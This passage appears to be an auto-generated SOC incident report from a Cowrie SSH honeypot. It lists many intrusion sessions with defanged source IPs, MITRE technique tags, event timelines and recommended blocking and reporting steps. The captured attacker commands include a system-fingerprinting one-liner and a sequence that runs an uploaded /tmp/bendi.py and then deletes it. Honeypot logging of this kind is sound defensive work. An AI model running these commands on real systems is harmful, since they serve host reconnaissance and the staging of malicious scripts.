| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:55` | `cowrie.log.closed` |
| `2026-07-11 07:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38686a6225c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:30 |
| **Last Seen** | 2026-07-11 07:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:30:37` | `cowrie.session.connect` |
| `2026-07-11 07:30:37` | `cowrie.client.version` |
| `2026-07-11 07:30:37` | `cowrie.client.kex` |
| `2026-07-11 07:30:38` | `cowrie.login.success` |
| `2026-07-11 07:30:40` | `cowrie.session.params` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.success` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.command.input` |
| `2026-07-11 07:30:40` | `cowrie.log.closed` |
| `2026-07-11 07:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89f4c2ccd12

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 07:31 |
| **Last Seen** | 2026-07-11 07:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:31:26` | `cowrie.session.connect` |
| `2026-07-11 07:31:26` | `cowrie.client.version` |
| `2026-07-11 07:31:26` | `cowrie.client.kex` |
| `2026-07-11 07:31:29` | `cowrie.login.success` |
| `2026-07-11 07:31:31` | `cowrie.session.params` |
| `2026-07-11 07:31:31` | `cowrie.command.input` |
| `2026-07-11 07:31:31` | `cowrie.log.closed` |
| `2026-07-11 07:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0caf19cee55

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 07:32 |
| **Last Seen** | 2026-07-11 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:32:17` | `cowrie.session.connect` |
| `2026-07-11 07:32:17` | `cowrie.client.version` |
| `2026-07-11 07:32:17` | `cowrie.client.kex` |
| `2026-07-11 07:32:17` | `cowrie.login.success` |
| `2026-07-11 07:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac45f936d9a

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 07:32 |
| **Last Seen** | 2026-07-11 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:32:17` | `cowrie.session.connect` |
| `2026-07-11 07:32:17` | `cowrie.client.version` |
| `2026-07-11 07:32:17` | `cowrie.client.kex` |
| `2026-07-11 07:32:17` | `cowrie.login.success` |
| `2026-07-11 07:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003bb078a042

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:32 |
| **Last Seen** | 2026-07-11 07:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:32:21` | `cowrie.session.connect` |
| `2026-07-11 07:32:21` | `cowrie.client.version` |
| `2026-07-11 07:32:21` | `cowrie.client.kex` |
| `2026-07-11 07:32:22` | `cowrie.login.success` |
| `2026-07-11 07:32:23` | `cowrie.session.params` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.success` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.command.input` |
| `2026-07-11 07:32:23` | `cowrie.log.closed` |
| `2026-07-11 07:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b834eb29a784

| Field | Detail |
|---|---|
| **Source IP** | `223.82.97[.]51` |
| **First Seen** | 2026-07-11 07:32 |
| **Last Seen** | 2026-07-11 07:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:32:24` | `cowrie.session.connect` |
| `2026-07-11 07:32:24` | `cowrie.client.version` |
| `2026-07-11 07:32:24` | `cowrie.client.kex` |
| `2026-07-11 07:32:28` | `cowrie.login.success` |
| `2026-07-11 07:32:29` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.97[.]51` to AbuseIPDB if not already reported
- [ ] Block `223.82.97[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee3c1687843

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 07:32 |
| **Last Seen** | 2026-07-11 07:34 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:32:33` | `cowrie.session.connect` |
| `2026-07-11 07:32:33` | `cowrie.client.version` |
| `2026-07-11 07:32:34` | `cowrie.client.kex` |
| `2026-07-11 07:32:34` | `cowrie.login.success` |
| `2026-07-11 07:32:35` | `cowrie.session.file_upload` |
| `2026-07-11 07:32:36` | `cowrie.session.params` |
| `2026-07-11 07:32:36` | `cowrie.command.input` |
| `2026-07-11 07:32:36` | `cowrie.command.input` |
| `2026-07-11 07:32:36` | `cowrie.command.input` |
| `2026-07-11 07:32:36` | `cowrie.command.failed` |
| `2026-07-11 07:32:36` | `cowrie.log.closed` |
| `2026-07-11 07:32:36` | `cowrie.session.params` |
| `2026-07-11 07:32:36` | `cowrie.command.input` |
| `2026-07-11 07:32:37` | `cowrie.log.closed` |
| `2026-07-11 07:32:37` | `cowrie.session.params` |
| `2026-07-11 07:32:37` | `cowrie.command.input` |
| `2026-07-11 07:32:37` | `cowrie.log.closed` |
| `2026-07-11 07:32:38` | `cowrie.session.params` |
| `2026-07-11 07:32:38` | `cowrie.command.input` |
| `2026-07-11 07:32:38` | `cowrie.command.failed` |
| `2026-07-11 07:32:38` | `cowrie.command.failed` |
| `2026-07-11 07:33:39` | `cowrie.session.params` |
| `2026-07-11 07:33:39` | `cowrie.command.input` |
| `2026-07-11 07:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e1a3b1d3ce0

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-07-11 07:33 |
| **Last Seen** | 2026-07-11 07:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:33:31` | `cowrie.session.connect` |
| `2026-07-11 07:33:32` | `cowrie.client.version` |
| `2026-07-11 07:33:32` | `cowrie.client.kex` |
| `2026-07-11 07:33:34` | `cowrie.login.success` |
| `2026-07-11 07:33:35` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dfff673cae9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:34 |
| **Last Seen** | 2026-07-11 07:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:34:05` | `cowrie.session.connect` |
| `2026-07-11 07:34:05` | `cowrie.client.version` |
| `2026-07-11 07:34:05` | `cowrie.client.kex` |
| `2026-07-11 07:34:06` | `cowrie.login.success` |
| `2026-07-11 07:34:07` | `cowrie.session.params` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.success` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.command.input` |
| `2026-07-11 07:34:07` | `cowrie.log.closed` |
| `2026-07-11 07:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bed511d38e

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 07:34 |
| **Last Seen** | 2026-07-11 07:37 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:34:55` | `cowrie.session.connect` |
| `2026-07-11 07:34:55` | `cowrie.client.version` |
| `2026-07-11 07:34:55` | `cowrie.client.kex` |
| `2026-07-11 07:34:55` | `cowrie.login.success` |
| `2026-07-11 07:34:56` | `cowrie.session.file_upload` |
| `2026-07-11 07:34:57` | `cowrie.session.params` |
| `2026-07-11 07:34:57` | `cowrie.command.input` |
| `2026-07-11 07:34:57` | `cowrie.command.input` |
| `2026-07-11 07:34:57` | `cowrie.command.input` |
| `2026-07-11 07:34:57` | `cowrie.command.failed` |
| `2026-07-11 07:34:57` | `cowrie.log.closed` |
| `2026-07-11 07:34:58` | `cowrie.session.params` |
| `2026-07-11 07:34:58` | `cowrie.command.input` |
| `2026-07-11 07:34:58` | `cowrie.log.closed` |
| `2026-07-11 07:34:59` | `cowrie.session.params` |
| `2026-07-11 07:34:59` | `cowrie.command.input` |
| `2026-07-11 07:34:59` | `cowrie.log.closed` |
| `2026-07-11 07:35:00` | `cowrie.session.params` |
| `2026-07-11 07:35:00` | `cowrie.command.input` |
| `2026-07-11 07:35:00` | `cowrie.command.failed` |
| `2026-07-11 07:35:00` | `cowrie.command.failed` |
| `2026-07-11 07:36:01` | `cowrie.session.params` |
| `2026-07-11 07:36:01` | `cowrie.command.input` |
| `2026-07-11 07:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac83e02f144

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:35 |
| **Last Seen** | 2026-07-11 07:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:35:47` | `cowrie.session.connect` |
| `2026-07-11 07:35:47` | `cowrie.client.version` |
| `2026-07-11 07:35:47` | `cowrie.client.kex` |
| `2026-07-11 07:35:48` | `cowrie.login.success` |
| `2026-07-11 07:35:49` | `cowrie.session.params` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.success` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:49` | `cowrie.command.input` |
| `2026-07-11 07:35:50` | `cowrie.log.closed` |
| `2026-07-11 07:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a177d4c1a58

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-11 07:35 |
| **Last Seen** | 2026-07-11 07:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:35:55` | `cowrie.session.connect` |
| `2026-07-11 07:35:56` | `cowrie.client.version` |
| `2026-07-11 07:35:56` | `cowrie.client.kex` |
| `2026-07-11 07:35:58` | `cowrie.login.success` |
| `2026-07-11 07:35:59` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5910b94e4c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:37 |
| **Last Seen** | 2026-07-11 07:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:37:31` | `cowrie.session.connect` |
| `2026-07-11 07:37:31` | `cowrie.client.version` |
| `2026-07-11 07:37:31` | `cowrie.client.kex` |
| `2026-07-11 07:37:32` | `cowrie.login.success` |
| `2026-07-11 07:37:34` | `cowrie.session.params` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.success` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.command.input` |
| `2026-07-11 07:37:34` | `cowrie.log.closed` |
| `2026-07-11 07:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9171d822301

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:39 |
| **Last Seen** | 2026-07-11 07:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:39:15` | `cowrie.session.connect` |
| `2026-07-11 07:39:15` | `cowrie.client.version` |
| `2026-07-11 07:39:15` | `cowrie.client.kex` |
| `2026-07-11 07:39:16` | `cowrie.login.success` |
| `2026-07-11 07:39:17` | `cowrie.session.params` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.success` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.command.input` |
| `2026-07-11 07:39:17` | `cowrie.log.closed` |
| `2026-07-11 07:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174ef1cd0c91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:40 |
| **Last Seen** | 2026-07-11 07:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:40:56` | `cowrie.session.connect` |
| `2026-07-11 07:40:56` | `cowrie.client.version` |
| `2026-07-11 07:40:56` | `cowrie.client.kex` |
| `2026-07-11 07:40:57` | `cowrie.login.success` |
| `2026-07-11 07:40:58` | `cowrie.session.params` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.success` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:58` | `cowrie.command.input` |
| `2026-07-11 07:40:59` | `cowrie.log.closed` |
| `2026-07-11 07:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb68ad247f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:42 |
| **Last Seen** | 2026-07-11 07:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
